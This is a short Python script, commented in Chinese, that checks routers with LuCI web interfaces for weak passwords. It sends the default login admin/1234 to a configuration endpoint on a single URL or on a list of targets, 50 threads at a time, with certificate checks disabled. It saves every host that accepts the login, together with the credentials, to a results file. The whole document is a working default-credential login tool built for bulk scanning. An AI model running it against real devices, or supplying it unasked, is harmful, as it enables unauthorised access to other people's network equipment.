import argparse,re,requests,sys
from multiprocessing.dummy import Pool

# 禁用 HTTPS 警告
requests.packages.urllib3.disable_warnings()

def banner():
    test = """"""
    print(test)
    print("[*] LUCI cgi-bin 弱口令检测脚本")

#密码列表
passworld = [("admin","1234")]

def poc(target):
    url1 = "/cgi-bin/luci/expert/configuration"
    headers = {"Content-Type":"application/x-www-form-urlencoded"}

    for username, password in passworld:
        payload = {"language_choice":"en","username":username,"password":password,"time_choice":"GMT-0"}
        try:
            res = requests.post(url=target+url1, data=payload, headers=headers, timeout=5, verify=False)
            if res.status_code == 200 and re.search(r"configuration", res.text, re.I):
                print(f"[+]{target} 弱口令: {username}/{password}")
                with open('zy3result.txt','a',encoding='utf-8') as fp:
                    fp.write(f"{target} {username}/{password}\n")
                break
            else:
                print(f"[-]{target} 尝试 {username}/{password} 失败")
        except:
            pass

def main():
    banner()
    parse = argparse.ArgumentParser(description="LUCI cgi-bin 弱口令检测脚本")
    
    #添加参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")
    
    #实例化
    args = parse.parse_args()
    
    #判断用户输入
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usage: Python {sys.argv[0]} -h")

#程序入口
if __name__ == "__main__":
    main()